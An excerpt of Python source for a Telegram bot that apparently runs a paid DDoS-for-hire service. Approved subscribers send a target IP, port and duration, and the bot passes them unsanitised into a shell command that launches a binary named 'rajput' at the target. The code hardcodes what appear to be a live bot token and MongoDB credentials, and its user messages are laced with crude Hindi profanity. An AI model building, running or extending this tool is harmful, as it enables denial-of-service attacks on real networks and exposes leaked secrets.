...
TOKEN = '7682560871:AAHIrO7wpPuzUe52k_Q1nff3IH8W4cXJK2M'
MONGO_URI = 'mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
FORWARD_CHANNEL_ID = -1002497887099
CHANNEL_ID = -1002497887099
error_channel_id = -1002497887099
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./rajput {target_ip} {target_port} {duration} 60")
...
def approve_or_disapprove_user(message):
    ...
    if action == '/approve':
        ...
        msg_text = (f"*🎉 Madharchod*\n"
                    f"*User {target_user_id} ye Madharchod ko approve dediya *\n"
                    f"*Plan: {plan} for {days} days!*\n"
                    f"*Welcome to our madarchod  community! Chalo lobby ki ma chod kar aate hai! ✨*")
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @RAJPUTDDOS", parse_mode='Markdown')  # Contact owner message
            return
        ...
        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Please wait!*\n"  # Busy message
                                       "*Abhi main dusre lobby ki gand Marne Mein Busy hun thoda wait kar.*\n"  # Current attack message
                                       "*Check karna madrachod kitna time Baki Hai /when command.*", parse_mode='Markdown')  # Check remaining time
            return
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  # Attack launched message
                                           ...
                                           f"*⏰ Duration: {duration} seconds! Gand marne mai maza aarha hai ! 🔥*", parse_mode='Markdown')  # Duration message
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*Koi bhi problem ho to baap se baat kar: @RAJPUTDDOS * "  # Contact owner message
